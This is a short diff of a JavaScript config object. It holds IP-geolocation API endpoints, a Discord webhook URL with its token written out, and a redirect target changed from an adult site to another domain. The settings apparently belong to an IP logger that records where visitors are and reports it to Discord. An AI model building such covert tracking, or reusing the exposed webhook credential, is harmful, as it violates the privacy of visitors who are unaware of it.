@@ -9,7 +9,7 @@ const CONFIG = {
   ipGeoUrl:       "https://api.techniknews.net/ipgeo/",
   fallbackApiUrl: "https://ip-api.com/json/",
   webhookUrl:     "https://discord.com/api/webhooks/1566653634194837574/oPIKFaD-Sxb-YZTdwIZMYT4umfp6U4r96O8p7vDZjziMMGmAWOji3My4UbE2YZREqkAK",
-  redirectUrl:    "https://www.pornhub.com/",
+  redirectUrl:    "https://skate.aaddpp.lol/",
   timeoutMs:      5000
 };
 
